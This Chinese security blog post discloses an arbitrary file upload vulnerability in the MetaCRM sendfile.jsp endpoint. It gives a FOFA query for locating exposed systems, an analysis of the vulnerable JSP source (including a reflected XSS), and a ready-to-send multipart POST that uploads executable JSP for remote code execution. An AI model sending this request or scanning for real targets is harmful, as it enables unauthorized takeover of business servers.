---
title: "MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞"
source: https://mrxn.net/jswz/metasoft-business-sendfile-upload-rce.html
asset_dir: assets/metacrm-客户关系管理系统-sendfile.jsp-任意文件上传漏洞
---

# MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/30 08:25
- 1699浏览
- [0评论](#comment)
- 45分钟阅读

深入探索

script language

计算机安全

服务器

---

# 漏洞简介

MetaCRM 是一款广泛应用于企业客户信息管理、[业务流程](#)自动化及销售支持的[客户关系管理](#)系统。该系统中的 sendfile.jsp 接口存在[任意文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意[脚本](#)。一旦利用此漏洞，攻击者可能在服务器上部署后门、WebShell 等恶意程序，从而实现[远程代码执行](https://mrxn.net/tag/rce)、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。该漏洞严重威胁系统的安全性与数据完整性，需及时修补和加固防护。

客户关系管理

# 影响版本

# fofa语法

```
body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
```

# 漏洞分析

我们直接看 `sendfile.jsp` 的业务逻辑实现

```
<%@ page contentType="text/html;charset=UTF-8"%>
<%
//
    com.metasoft.framework.pub.util.UserState us = com.metasoft.framework.model.users.UserManager.getUserBySessionId(session.getId());
    com.metasoft.framework.pub.locale.ResourceService ress=null;
    if (us!=null) {
      ress=us.getRess();
    }
    if (ress==null)
      ress=new com.metasoft.framework.pub.locale.ResourceService();

                com.metasoft.framework.pub.upload.Upload myUpload=new com.metasoft.framework.pub.upload.Upload();
                myUpload.initialize(pageContext);
                myUpload.upload();

                String objectname = myUpload.getRequest().getParameter("objectname");
                String repeatrule=myUpload.getRequest().getParameter("repeatrule");
                String refrule=myUpload.getRequest().getParameter("refrule");
                String filetype = myUpload.getRequest().getParameter("filetype");
//              String filename = myUpload.getRequest().getParameter("filename");
                String flag = myUpload.getRequest().getParameter("flag");
                String fieldimp=myUpload.getRequest().getParameter("fieldimp");
                String affix = myUpload.getFiles().getFile(0).getFileName();
                int iCount = myUpload.getFiles().getFile(0).getSize();
                String path = com.metasoft.framework.pub.util.Path.getUserFile()+"temp"+java.io.File.separator;
                String fileFullName = "";
                if (iCount != 0) {
                    String fieldID = com.metasoft.framework.pub.util.UUID.getID();
                    if(affix.indexOf(".")!=-1)
                        fieldID +=affix.substring(affix.lastIndexOf("."));
                    fileFullName = path+fieldID;    
                    int iSaveCount = myUpload.saveAs(path, fieldID);
                    boolean bSaveCount=iSaveCount==0?true:false;
                    if(bSaveCount){
                        request.setAttribute("uploaderror",ress.getDispMessage("ui.common.importdata.uploadfail")+"!");
                        %>
        <jsp:forward page="/business/common/importdata/home.jsp"/>
    <%

    }
    }else{
            request.setAttribute("uploaderror",ress.getDispMessage("ui.common.importdata.uploadfail")+"!");
        %>
            <jsp:forward page="/business/common/importdata/home.jsp"/>
        <%
    }

    %>  
<html>  
    <body>      
        <form name = "formdata" method ="post" action="/importdata.nextone.do">
            <input type="hidden" name="objectname" value='<%=objectname%>'>
            <input type="hidden" name="repeatrule" value='<%=repeatrule%>'>
            <input type="hidden" name="refrule" value='<%=refrule%>'>
            <input type="hidden" name="fieldimp" value='<%=fieldimp%>'>
            <input type="hidden" name="filetype" value='<%=filetype%>'>
            <input type="hidden" name="filename" value='<%=affix%>'>
            <input type="hidden" name="fullfilename" value='<%=fileFullName%>'>
            <input type="hidden" name ="flag" value='<%=flag %>'>
        </form>
        <script language="JavaScript">
            document.forms['formdata'].submit();
        </script>
    </body>
</html>
```

仅检查了文件大小是否为0，但不限制可上传的文件类型和内容格式，从而导致任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

同时该文件还存在反射性[XSS漏洞](https://mrxn.net/tag/xss)，因HTML表单部分 `<input type="hidden" name="objectname" value='<%=objectname%>'>` 的数据来自用户提交，直接通过 `myUpload.getRequest().getParameter()` 获取，并使用 JSP 表达式 `<%= %>` 直接输出到HTML中。缺失了对输入的转义或 sanitization。其他 repeatrule、refrule、fieldimp、filetype、flag 等参数也是如此。

漏洞预警服务

# 漏洞复现

```
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp "

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

[![MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞](images/img-001-6f65ea6cdeae.webp)](https://image.mrxn.net/7655917ed38d4f9893bb765161d00b23.webp)

响应里回显了上传文件路径，直接访问，成功执行上传代码达到[RCE](https://mrxn.net/tag/rce)

[![MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞](images/img-002-8e13d1f310c9.webp)](https://image.mrxn.net/e8ebaf8d346a490f8dacb2ab616623c6.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
